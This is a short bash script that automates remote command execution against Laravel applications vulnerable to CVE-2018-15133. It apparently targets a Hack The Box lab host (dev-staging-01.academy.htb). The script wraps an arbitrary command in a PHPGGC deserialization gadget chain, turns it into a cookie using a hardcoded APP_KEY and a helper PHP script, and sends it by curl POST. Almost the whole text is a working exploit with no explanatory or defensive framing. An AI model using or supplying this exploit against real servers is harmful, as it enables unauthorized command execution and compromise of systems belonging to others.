#!/bin/bash
#Simple script to automatize remote comand on Laravel application vulnerable to CVE-2018-15133
#The script need the APP_KEY and the URL of Laravel installation. 
#Usage: auto_exploit.sh "uname -a"


APP_KEY="dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
COMANDO=$1

PAYLOAD=`phpggc Laravel/RCE1 system  "$COMANDO" -b`

#Create Cookie
COOKIE=`php exploit_laravel.php $APP_KEY $PAYLOAD` 
#echo $COOKIE
#exit
#Richiesta HTTP
curl http://dev-staging-01.academy.htb/ -X POST -H "$COOKIE" | head -n 20
